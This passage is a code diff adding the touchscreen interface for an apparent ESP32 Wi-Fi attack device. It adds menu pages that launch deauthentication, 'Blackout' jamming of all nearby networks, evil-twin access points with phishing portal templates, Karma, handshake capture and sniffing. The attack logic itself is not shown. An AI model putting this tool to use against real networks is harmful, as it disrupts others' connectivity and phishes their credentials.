+static void create_function_page_base(const char *name)
+{
+    // Print memory stats when opening new page
+    print_memory_stats();
+    
+    evil_twin_disable_log_capture();
+    evil_twin_log_ta = NULL;
+    evil_twin_content = NULL;
+    evil_twin_network_dd = NULL;
+    evil_twin_html_dd = NULL;
+    evil_twin_start_btn = NULL;
+    evil_twin_status_label = NULL;
+
+    blackout_disable_log_capture();
+    blackout_log_ta = NULL;
+    blackout_stop_btn = NULL;
+    blackout_ui_active = false;
+
+    snifferdog_disable_log_capture();
+    snifferdog_log_ta = NULL;
+    snifferdog_stop_btn = NULL;
+    snifferdog_ui_active = false;
+
+    sniffer_disable_log_capture();
+    sniffer_log_ta = NULL;
+    sniffer_stop_btn = NULL;
+    sniffer_ui_active = false;
+
+    sae_overflow_disable_log_capture();
+    sae_overflow_log_ta = NULL;
+    sae_overflow_stop_btn = NULL;
+    sae_overflow_ui_active = false;
+
+    handshake_disable_log_capture();
+    handshake_log_ta = NULL;
+    handshake_stop_btn = NULL;
+    handshake_ui_active = false;
+    handshake_attack_active = false;
+    handshake_attack_task_handle = NULL;
+
+    wardrive_disable_log_capture();
+    wardrive_log_ta = NULL;
+    wardrive_stop_btn = NULL;
+    wardrive_ui_active = false;
+
+    karma_disable_log_capture();
+    karma_log_ta = NULL;
+    karma_stop_btn = NULL;
+    karma_content = NULL;
+    karma_probe_dd = NULL;
+    karma_html_dd = NULL;
+    karma_start_btn = NULL;
+    karma_ui_active = false;
+
+    portal_content = NULL;
+    portal_ssid_ta = NULL;
+    portal_html_dd = NULL;
+    portal_start_btn = NULL;
+    portal_keyboard = NULL;
+
+    if (function_page) {
+        lv_obj_del(function_page);
+        function_page = NULL;
+    }
+
+    // Hide menu and title bar while the function page is active
+    lv_obj_add_flag(menu_obj, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_add_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
+
+    function_page = lv_obj_create(lv_scr_act());
+    lv_obj_set_size(function_page, lv_pct(100), lv_pct(100));
+    lv_obj_align(function_page, LV_ALIGN_CENTER, 0, 0);
+    lv_obj_set_style_bg_color(function_page, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_border_width(function_page, 0, 0);
+    lv_obj_set_style_radius(function_page, 0, 0);
+    lv_obj_set_style_pad_all(function_page, 0, 0);
+
+    lv_obj_t *page_title_bar = lv_obj_create(function_page);
+    lv_obj_set_size(page_title_bar, lv_pct(100), 30);
+    lv_obj_align(page_title_bar, LV_ALIGN_TOP_MID, 0, 0);
+    lv_obj_set_style_bg_color(page_title_bar, lv_color_make(20, 20, 20), 0);
+    lv_obj_set_style_border_width(page_title_bar, 0, 0);
+    lv_obj_set_style_radius(page_title_bar, 0, 0);
+    lv_obj_clear_flag(page_title_bar, LV_OBJ_FLAG_SCROLLABLE);  // No scroll
+
+    lv_obj_t *back_btn = lv_btn_create(page_title_bar);
+    lv_obj_set_size(back_btn, 30, 30);
+    lv_obj_align(back_btn, LV_ALIGN_LEFT_MID, 0, 0);
+    lv_obj_set_style_bg_color(back_btn, lv_color_make(40, 40, 40), 0);
+    lv_obj_set_style_radius(back_btn, 5, 0);
+    lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *back_label = lv_label_create(back_btn);
+    lv_label_set_text(back_label, LV_SYMBOL_CLOSE);
+    lv_obj_set_style_text_color(back_label, lv_color_make(255, 0, 0), 0);
+    lv_obj_center(back_label);
+
+    lv_obj_t *page_title_label = lv_label_create(page_title_bar);
+    lv_label_set_text(page_title_label, name ? name : "");
+    lv_obj_set_style_text_color(page_title_label, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(page_title_label);
+}
+
+void show_menu(void)
+{
+    evil_twin_log_capture_enabled = false;
+    evil_twin_log_ta = NULL;
+    // Delete function page if it exists
+    if (function_page) {
+        lv_obj_del(function_page);
+        function_page = NULL;
+    }
+    // scan_list lives under function_page; NULL already if page deleted
+    
+    // Show menu and title bar
+    lv_obj_clear_flag(menu_obj, LV_OBJ_FLAG_HIDDEN);
+    lv_obj_clear_flag(title_bar, LV_OBJ_FLAG_HIDDEN);
+}
+
+void show_function_page(const char *name)
+{
+    create_function_page_base(name);
+    // Center text showing function name
+    lv_obj_t *center_label = lv_label_create(function_page);
+    lv_label_set_text(center_label, name);
+    lv_obj_set_style_text_font(center_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(center_label, lv_color_make(0, 255, 0), 0);  // Green text (retro terminal)
+    lv_obj_center(center_label);
+    
+    // Logging removed to avoid VFS writes during draw
+}
+
+static void show_evil_twin_page(void)
+{
+    create_function_page_base("Evil Twin");
+    wifi_attacks_refresh_sd_html_list();
+
+    evil_twin_content = lv_obj_create(function_page);
+    lv_obj_set_size(evil_twin_content, lv_pct(100), LCD_V_RES - 30);
+    lv_obj_align(evil_twin_content, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_opa(evil_twin_content, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(evil_twin_content, 0, 0);
+    lv_obj_set_style_pad_all(evil_twin_content, 10, 0);
+    lv_obj_set_style_pad_gap(evil_twin_content, 10, 0);
+    lv_obj_set_flex_flow(evil_twin_content, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(evil_twin_content, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START, LV_FLEX_ALIGN_START);
+
+    // Status label at the top
+    evil_twin_status_label = lv_label_create(evil_twin_content);
+    lv_obj_set_style_text_font(evil_twin_status_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(evil_twin_status_label, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_label_set_text(evil_twin_status_label, "Select network and portal template");
+
+    lv_obj_t *net_label = lv_label_create(evil_twin_content);
+    lv_label_set_text(net_label, "Evil Twin name:");
+    lv_obj_set_style_text_font(net_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(net_label, lv_color_make(0, 255, 0), 0);  // Green text
+
+    evil_twin_network_dd = lv_dropdown_create(evil_twin_content);
+    lv_obj_set_width(evil_twin_network_dd, lv_pct(100));
+    lv_dropdown_set_dir(evil_twin_network_dd, LV_DIR_BOTTOM);
+    // Retro terminal styling for dropdown
+    lv_obj_set_style_bg_color(evil_twin_network_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
+    lv_obj_set_style_text_color(evil_twin_network_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green text
+    lv_obj_set_style_border_color(evil_twin_network_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green border
+    lv_obj_t *dd_list1 = lv_dropdown_get_list(evil_twin_network_dd);
+    if (dd_list1) {
+        lv_obj_set_style_bg_color(dd_list1, lv_color_make(0, 0, 0), 0);  // Black background for list
+        lv_obj_set_style_text_color(dd_list1, lv_color_make(0, 255, 0), 0);  // Green text for list
+        lv_obj_set_style_border_color(dd_list1, lv_color_make(0, 255, 0), 0);  // Green border
+    }
+
+    evil_twin_network_count = 0;
+    int selected_indices[SCAN_RESULTS_MAX_DISPLAY];
+    int selected_count = wifi_scanner_get_selected(selected_indices, SCAN_RESULTS_MAX_DISPLAY);
+    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
+    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
+    uint16_t total_count = count_ptr ? *count_ptr : 0;
+
+    size_t max_networks = (selected_count < SCAN_RESULTS_MAX_DISPLAY) ? selected_count : SCAN_RESULTS_MAX_DISPLAY;
+    size_t net_buf_size = (max_networks > 0 ? max_networks : 1) * 64;
+    char *net_options = (char *)lv_mem_alloc(net_buf_size);
+    if (!net_options) {
+        net_options = "No networks selected";
+        max_networks = 0;
+    }
+
+    size_t net_len = 0;
+    if (net_options != (char *)"No networks selected") {
+        net_options[0] = '\0';
+    }
+
+    for (int i = 0; i < selected_count && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
+        int idx = selected_indices[i];
+        if (!records || idx < 0 || idx >= total_count) {
+            continue;
+        }
+
+        char entry[64];
+        if (records[idx].ssid[0]) {
+            snprintf(entry, sizeof(entry), "%s (%d dBm)\n", (const char *)records[idx].ssid, records[idx].rssi);
+        } else {
+            snprintf(entry, sizeof(entry), "%02X:%02X:%02X:%02X:%02X:%02X (%d dBm)\n",
+                     records[idx].bssid[0], records[idx].bssid[1], records[idx].bssid[2],
+                     records[idx].bssid[3], records[idx].bssid[4], records[idx].bssid[5],
+                     records[idx].rssi);
+        }
+
+        size_t entry_len = strlen(entry);
+        if (net_options != (char *)"No networks selected" && net_len + entry_len < net_buf_size) {
+            memcpy(net_options + net_len, entry, entry_len);
+            net_len += entry_len;
+            net_options[net_len] = '\0';
+            evil_twin_network_map[evil_twin_network_count++] = idx;
+        }
+    }
+
+    if (evil_twin_network_count == 0) {
+        if (net_options != (char *)"No networks selected") {
+            snprintf(net_options, net_buf_size, "No networks selected");
+        }
+        evil_twin_network_count = 0;
+    }
+
+    lv_dropdown_set_options(evil_twin_network_dd, net_options);
+    lv_dropdown_set_selected(evil_twin_network_dd, 0);
+
+    if (net_options != (char *)"No networks selected") {
+        lv_mem_free(net_options);
+    }
+
+    lv_obj_t *html_label = lv_label_create(evil_twin_content);
+    lv_label_set_text(html_label, "HTML Portal");
+    lv_obj_set_style_text_font(html_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(html_label, lv_color_make(0, 255, 0), 0);  // Green text
+
+    evil_twin_html_dd = lv_dropdown_create(evil_twin_content);
+    lv_obj_set_width(evil_twin_html_dd, lv_pct(100));
+    lv_dropdown_set_dir(evil_twin_html_dd, LV_DIR_BOTTOM);
+    // Retro terminal styling for dropdown
+    lv_obj_set_style_bg_color(evil_twin_html_dd, lv_color_make(0, 0, 0), LV_PART_MAIN);  // Black background
+    lv_obj_set_style_text_color(evil_twin_html_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green text
+    lv_obj_set_style_border_color(evil_twin_html_dd, lv_color_make(0, 255, 0), LV_PART_MAIN);  // Green border
+    lv_obj_t *dd_list2 = lv_dropdown_get_list(evil_twin_html_dd);
+    if (dd_list2) {
+        lv_obj_set_style_bg_color(dd_list2, lv_color_make(0, 0, 0), 0);  // Black background for list
+        lv_obj_set_style_text_color(dd_list2, lv_color_make(0, 255, 0), 0);  // Green text for list
+        lv_obj_set_style_border_color(dd_list2, lv_color_make(0, 255, 0), 0);  // Green border
+    }
+
+    int html_total = wifi_attacks_get_sd_html_count();
+    size_t max_html = (html_total < SCAN_RESULTS_MAX_DISPLAY) ? html_total : SCAN_RESULTS_MAX_DISPLAY;
+    size_t html_buf_size = (max_html > 0 ? max_html : 1) * 64;
+    char *html_options = (char *)lv_mem_alloc(html_buf_size);
+    if (!html_options) {
+        html_options = "No HTML templates";
+        max_html = 0;
+    }
+
+    size_t html_len = 0;
+    if (html_options != (char *)"No HTML templates") {
+        html_options[0] = '\0';
+    }
+
+    for (int i = 0; i < html_total && i < SCAN_RESULTS_MAX_DISPLAY; i++) {
+        const char *name = wifi_attacks_get_sd_html_name(i);
+        if (!name) {
+            continue;
+        }
+        char entry[64];
+        const char *display = strrchr(name, '/');
+        if (display) {
+            display++;
+        } else {
+            display = name;
+        }
+        snprintf(entry, sizeof(entry), "%s\n", display);
+        size_t entry_len = strlen(entry);
+        if (html_options != (char *)"No HTML templates" && html_len + entry_len < html_buf_size) {
+            memcpy(html_options + html_len, entry, entry_len);
+            html_len += entry_len;
+            html_options[html_len] = '\0';
+            evil_twin_html_map[evil_twin_html_count++] = i;
+        }
+    }
+
+    if (evil_twin_html_count == 0) {
+        if (html_options != (char *)"No HTML templates") {
+            snprintf(html_options, html_buf_size, "No HTML templates");
+        }
+    }
+
+    lv_dropdown_set_options(evil_twin_html_dd, html_options);
+    lv_dropdown_set_selected(evil_twin_html_dd, 0);
+
+    if (html_options != (char *)"No HTML templates") {
+        lv_mem_free(html_options);
+    }
+
+    evil_twin_start_btn = lv_btn_create(evil_twin_content);
+    lv_obj_set_width(evil_twin_start_btn, lv_pct(100));
+    lv_obj_set_height(evil_twin_start_btn, 40);
+    // Retro terminal styling for button with visible border
+    lv_obj_set_style_bg_color(evil_twin_start_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+    lv_obj_set_style_bg_color(evil_twin_start_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+    lv_obj_set_style_border_color(evil_twin_start_btn, lv_color_make(0, 255, 0), 0);  // Green border
+    lv_obj_set_style_border_width(evil_twin_start_btn, 3, 0);  // Thick border (3px)
+    lv_obj_set_style_border_opa(evil_twin_start_btn, LV_OPA_COVER, 0);  // Fully opaque border
+    lv_obj_add_event_cb(evil_twin_start_btn, evil_twin_start_btn_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *start_label = lv_label_create(evil_twin_start_btn);
+    lv_label_set_text(start_label, "Start Evil Twin");
+    lv_obj_set_style_text_color(start_label, lv_color_make(0, 255, 0), 0);  // Green text
+    lv_obj_center(start_label);
+
+    // Update status label based on availability
+    if (evil_twin_network_count == 0 || evil_twin_html_count == 0) {
+        lv_obj_add_state(evil_twin_start_btn, LV_STATE_DISABLED);
+        if (evil_twin_network_count == 0) {
+            lv_label_set_text(evil_twin_status_label, "No selected networks available");
+        } else {
+            lv_label_set_text(evil_twin_status_label, "No HTML templates found on SD card");
+        }
+    } else {
+        lv_obj_clear_state(evil_twin_start_btn, LV_STATE_DISABLED);
+    }
+}
+
+void menu_event_cb(lv_event_t *e)
+{
+	// Get user data from the clicked object
+    
+    // Avoid printf in event callback to reduce VFS contention
+    
+    if (lv_event_get_code(e) == LV_EVENT_CLICKED) {
+        // Use event user data instead of raw object user_data to avoid invalid pointers
+        const char *name = (const char *)lv_event_get_user_data(e);
+        if (name != NULL) {
+            show_function_page(name);
+        }
+    }
+}
+
+void attack_event_cb(lv_event_t *e)
+{
+    const char *attack_name = (const char *)lv_event_get_user_data(e);
+    if (!attack_name) return;
+
+    if (strcmp(attack_name, "Scan") == 0) {
+        // Open scan page (clear previous content) - use base only to avoid default center label
+        create_function_page_base("Scan");
+
+        // Create spinner + status within function_page; ensure clean background
+        lv_obj_set_style_bg_color(function_page, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_bg_opa(function_page, LV_OPA_COVER, 0);
+
+        // Keep touch dot visible during scan
+        show_touch_dot = true;
+
+        // Delete old scan_status_label if exists
+        if (scan_status_label) {
+            lv_obj_del(scan_status_label);
+            scan_status_label = NULL;
+        }
+
+        // Large technical scanning message (no spinner)
+        scan_status_label = lv_label_create(function_page);
+        lv_label_set_text(scan_status_label, "Scanning...");
+        lv_obj_set_style_text_color(scan_status_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_text_font(scan_status_label, &lv_font_montserrat_20, 0);  // Larger font
+        lv_obj_center(scan_status_label);
+
+        // Start scan
+        wifi_scanner_start_scan();
+        return;
+    }
+
+    if (strcmp(attack_name, "Deauther") == 0) {
+        // Open Deauther page
+        show_function_page("Deauther");
+
+        // Save current selection as attack targets, then start deauth
+        wifi_scanner_save_target_bssids();
+        wifi_attacks_start_deauth();
+
+        // Prompt top-left
+        deauth_prompt_label = lv_label_create(function_page);
+        lv_label_set_text(deauth_prompt_label, "Networks attacked");
+        lv_obj_set_style_text_font(deauth_prompt_label, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(deauth_prompt_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_align(deauth_prompt_label, LV_ALIGN_TOP_LEFT, 6, 36);
+
+        // FPS top-right
+        deauth_fps_label = lv_label_create(function_page);
+        lv_label_set_text(deauth_fps_label, "0 FPS");
+        lv_obj_set_style_text_font(deauth_fps_label, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(deauth_fps_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_align(deauth_fps_label, LV_ALIGN_TOP_RIGHT, -6, 36);
+
+        // Build list of attacked SSIDs
+        if (deauth_list) { deauth_list = NULL; }
+        deauth_list = lv_list_create(function_page);
+        lv_obj_set_size(deauth_list, lv_pct(100), LCD_V_RES - 30 - 36 - 40);
+        lv_obj_align(deauth_list, LV_ALIGN_TOP_MID, 0, 56);
+        lv_obj_set_style_bg_color(deauth_list, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_text_color(deauth_list, lv_color_make(0, 255, 0), 0);  // Green text
+        // Remove white separator lines between items
+        lv_obj_set_style_border_width(deauth_list, 0, LV_PART_ITEMS);
+        lv_obj_set_style_border_color(deauth_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
+
+        int selected_indices[MAX_SCAN_RESULTS];
+        int sel_cnt = wifi_scanner_get_selected(selected_indices, MAX_SCAN_RESULTS);
+        if (sel_cnt <= 0) {
+            lv_list_add_text(deauth_list, "No networks selected");
+            // Still create bottom buttons
+        }
+
+        uint16_t total = wifi_scanner_get_count();
+        if (total == 0) {
+            lv_list_add_text(deauth_list, "No scan results available");
+            return;
+        }
+
+        wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total);
+        if (!records) {
+            lv_list_add_text(deauth_list, "Memory error");
+            return;
+        }
+        int got = wifi_scanner_get_results(records, total);
+
+        for (int i = 0; i < sel_cnt; i++) {
+            int idx = selected_indices[i];
+            if (idx < 0 || idx >= got) continue;
+
+            const wifi_ap_record_t *ap = &records[idx];
+            char line[64];
+            if (ap->ssid[0] != 0) {
+                snprintf(line, sizeof(line), "%s", (const char *)ap->ssid);
+            } else {
+                snprintf(line, sizeof(line), "%02X:%02X:%02X:%02X:%02X:%02X",
+                         ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                         ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+            }
+
+            // Use list button to get compact row; just a label
+            lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
+            lv_obj_set_width(row, lv_pct(100));
+            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
+            lv_obj_set_style_pad_all(row, 6, 0);
+            lv_obj_set_style_pad_gap(row, 8, 0);
+            lv_obj_set_height(row, LV_SIZE_CONTENT);
+            lv_obj_set_style_bg_color(row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+            lv_obj_set_style_bg_color(row, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+
+            lv_obj_t *lbl = lv_label_create(row);
+            lv_label_set_text(lbl, line);
+            lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+            lv_obj_set_style_text_font(lbl, &lv_font_montserrat_14, 0);
+            lv_obj_set_style_text_color(lbl, lv_color_make(0, 255, 0), 0);  // Green text
+            lv_obj_set_width(lbl, lv_pct(95));
+        }
+
+        lv_mem_free(records);
+
+        // Bottom buttons: Pause/Resume and Quit
+        lv_obj_t *btn_bar = lv_obj_create(function_page);
+        lv_obj_set_size(btn_bar, lv_pct(100), 40);
+        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, 0);
+        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_border_width(btn_bar, 0, 0);
+        lv_obj_set_style_radius(btn_bar, 0, 0);
+        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);  // No scroll
+        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
+        lv_obj_set_style_pad_all(btn_bar, 6, 0);
+        lv_obj_set_style_pad_gap(btn_bar, 8, 0);
+
+        deauth_pause_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(deauth_pause_btn, lv_pct(50), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(deauth_pause_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(deauth_pause_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_t *pause_lbl = lv_label_create(deauth_pause_btn);
+        lv_label_set_text(pause_lbl, deauth_paused ? "Resume" : "Pause");
+        lv_obj_set_style_text_color(pause_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(pause_lbl);
+        lv_obj_add_event_cb(deauth_pause_btn, deauth_pause_event_cb, LV_EVENT_CLICKED, NULL);
+
+        deauth_quit_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(deauth_quit_btn, lv_pct(50), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(deauth_quit_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(deauth_quit_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_t *quit_lbl = lv_label_create(deauth_quit_btn);
+        lv_label_set_text(quit_lbl, "Quit");
+        lv_obj_set_style_text_color(quit_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(quit_lbl);
+        lv_obj_add_event_cb(deauth_quit_btn, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
+        
+        deauth_paused = false;  // Reset pause state when starting
+        return;
+    }
+
+    if (strcmp(attack_name, "Evil Twin") == 0) {
+        show_evil_twin_page();
+        return;
+    }
+
+    if (strcmp(attack_name, "Blackout") == 0) {
+        // Show warning page - use base to avoid default center label
+        create_function_page_base("Blackout");
+        
+        // Warning message in center
+        lv_obj_t *warning_label = lv_label_create(function_page);
+        lv_label_set_text(warning_label, "Warning: This will attack\nall the networks around you.\n\nAre you sure?");
+        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_set_style_text_color(warning_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
+        lv_obj_center(warning_label);
+        
+        // Button container at bottom (15px higher)
+        lv_obj_t *btn_bar = lv_obj_create(function_page);
+        lv_obj_set_size(btn_bar, lv_pct(100), 50);
+        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
+        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_border_width(btn_bar, 0, 0);
+        lv_obj_set_style_radius(btn_bar, 0, 0);
+        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
+        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
+        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
+        
+        // BACK button (48% width to leave room for borders and padding)
+        lv_obj_t *back_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "BACK");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        // YES button (48% width to leave room for borders and padding)
+        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(yes_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
+        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
+        lv_label_set_text(yes_lbl, "YES");
+        lv_obj_set_style_text_color(yes_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(yes_lbl);
+        lv_obj_add_event_cb(yes_btn, blackout_yes_btn_cb, LV_EVENT_CLICKED, NULL);
+        
+        return;
+    }
+
+    if (strcmp(attack_name, "Snifferdog") == 0) {
+        // Show warning page - use base to avoid default center label
+        create_function_page_base("Snifferdog");
+        
+        // Warning message in center
+        lv_obj_t *warning_label = lv_label_create(function_page);
+        lv_label_set_text(warning_label, "Warning: This will start\nSnifferdog attack.\n\nAre you sure?");
+        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_set_style_text_color(warning_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
+        lv_obj_center(warning_label);
+        
+        // Button container at bottom (15px higher)
+        lv_obj_t *btn_bar = lv_obj_create(function_page);
+        lv_obj_set_size(btn_bar, lv_pct(100), 50);
+        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
+        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_border_width(btn_bar, 0, 0);
+        lv_obj_set_style_radius(btn_bar, 0, 0);
+        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
+        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
+        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
+        
+        // BACK button (48% width to leave room for borders and padding)
+        lv_obj_t *back_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "BACK");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        // YES button (48% width to leave room for borders and padding)
+        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(yes_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
+        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
+        lv_label_set_text(yes_lbl, "YES");
+        lv_obj_set_style_text_color(yes_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(yes_lbl);
+        lv_obj_add_event_cb(yes_btn, snifferdog_yes_btn_cb, LV_EVENT_CLICKED, NULL);
+        
+        return;
+    }
+
+    if (strcmp(attack_name, "Sniffer") == 0) {
+        // Show warning page - use base to avoid default center label
+        create_function_page_base("Sniffer");
+        
+        // Warning message in center
+        lv_obj_t *warning_label = lv_label_create(function_page);
+        lv_label_set_text(warning_label, "This will start\nWiFi Sniffer.\n\nAre you sure?");
+        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_set_style_text_color(warning_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
+        lv_obj_center(warning_label);
+        
+        // Button container at bottom (15px higher)
+        lv_obj_t *btn_bar = lv_obj_create(function_page);
+        lv_obj_set_size(btn_bar, lv_pct(100), 50);
+        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
+        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_border_width(btn_bar, 0, 0);
+        lv_obj_set_style_radius(btn_bar, 0, 0);
+        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
+        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
+        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
+        
+        // BACK button (48% width to leave room for borders and padding)
+        lv_obj_t *back_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);  // Green border
